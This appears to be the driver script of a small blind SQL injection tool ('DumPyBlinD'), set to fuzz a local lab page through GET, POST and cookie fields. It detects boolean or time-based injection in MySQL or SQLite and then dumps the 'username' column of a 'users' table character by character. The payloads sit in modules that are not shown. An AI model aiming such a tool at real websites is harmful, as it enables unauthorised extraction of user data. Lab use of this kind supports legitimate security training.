from lib.dct import *
from lib.msg import *
from data.mysql import *
from data.sqlite import *
from prettytable import PrettyTable
dump  = PrettyTable()

banner = '''

 _____                    ______         ______  __  __         _____  
|     \ .--.--..--------.|   __ \.--.--.|   __ \|  ||__|.-----.|     \ 
|  --  ||  |  ||        ||    __/|  |  ||   __ <|  ||  ||     ||  --  |
|_____/ |_____||__|__|__||___|   |___  ||______/|__||__||__|__||_____/ 
                                 |_____|               
								

								'''+Fore.YELLOW+'''v 0.5 by Fuzzme'''+Fore.RESET+'''

-------------------------------------------------------------------------

'''

clear()
print(banner)



postData = {'id':'1{fuzz}','submit':'Envoyer'}
headers = {'Cookie': 'IPv4=159.45.87.57{fuzz}'}


setting = {
	
	'sqli_type': 'TBSQLI',
	'method': 'GET',
	'url': 'http://127.0.0.1/Labs/SQLi/sqlite3/sqli-3.php?id=1{fuzz}',
	'delay': '0',
	'timeout': 10,
	'msg':'y',

	'headers': headers,
	'postData': postData,

	'tofind':'exists',
	'p_time': '3',


	'dbms': '',
	'charset': 'azertyuiopqsdfghjklmwxcvbn123456789AZERTYUIOPQSDFGHJKLMWXCVBN!.@-_+=',
	'column':'username',
	'table':'users',
	'startline':'0',


	'escape':'',
	'comment':'',
	'operator':'',
	'function': ''
}

method = setting['method']
sqli_type = setting['sqli_type']


if method == 'POST':
	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with POST method')
elif method == 'GET':
	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with GET method')
else:
	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] Starting DumPyBlinD with  HEAD method')


# Blind

if setting['sqli_type'] == 'BSQLI':
	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'MySQL\' > AND Boolean comparaison')

	if detect(setting, mysql, 'MySQL') == False:
		print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'SQLite\' > AND Boolean comparaison')

		if detect(setting, sqlite, 'SQLite') == False:
			print('\n['+Fore.RED+'CRITICAL'+Fore.RESET+'] Unable to set a payload !\n')
			exit();

# Time based

else:
	print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'MySQL\' > AND SLEEP(x)')
	detect(setting, mysql, 'MySQL')

	if detect(setting, mysql, 'MySQL') == False:
		print('['+Fore.GREEN+'INFO'+Fore.RESET+'] testing \'SQLite\' > Time Based Payload')

	
		if detect(setting, sqlite, 'SQLite') == False:
			print('\n['+Fore.RED+'CRITICAL'+Fore.RESET+'] Unable to set a payload !\n')

			exit();



rows = int(GetRows(setting))
GetData(setting, rows)
